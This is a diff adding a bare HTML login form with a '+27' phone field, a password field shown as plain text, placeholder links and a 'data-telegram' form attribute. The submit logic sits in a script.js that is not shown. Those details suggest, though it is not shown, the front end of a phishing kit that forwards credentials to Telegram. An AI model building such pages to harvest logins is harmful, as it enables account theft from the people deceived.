@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <link rel="stylesheet" href="/style.css">
+</head>
+
+<body>
+
+<div class="page">
+
+  <!-- Navigation -->
+  <div class="top-buttons">
+    <button type="button" class="nav-btn active">Login</button>
+    <button type="button" class="nav-btn">Sign Up</button>
+  </div>
+
+  <!-- Login panel -->
+  <div class="login-modal">
+
+    <div class="modal-header">
+      <h2>Login</h2>
+      <button type="button" class="close-btn">×</button>
+    </div>
+
+    <form id="accessForm" data-telegram>
+
+      <div class="phone-field">
+        <span>+27</span>
+        <input
+          type="tel"
+          name="phone"
+          placeholder="Mobile Number"
+          autocomplete="tel"
+        >
+      </div>
+
+      <div class="password-field">
+        <input
+          type="text"
+          id="userPassword"
+          placeholder="Enter password"
+          autocomplete="off"
+       >
+      </div>
+
+      <div class="forgot-links">
+        <a href="#">Forgot Username</a>
+        <a href="#">Forgot Password?</a>
+      </div>
+
+      <div class="signup-strip">
+        <span>Don't have an account yet?</span>
+        <a href="#">Sign Up ›</a>
+      </div>
+
+      <button type="submit" class="login-btn">Login</button>
+
+    </form>
+
+    <p id="statusMessage"></p>
+
+  </div>
+</div>
+
+<script src="/script.js" defer></script>
+
+</body>
+</html>
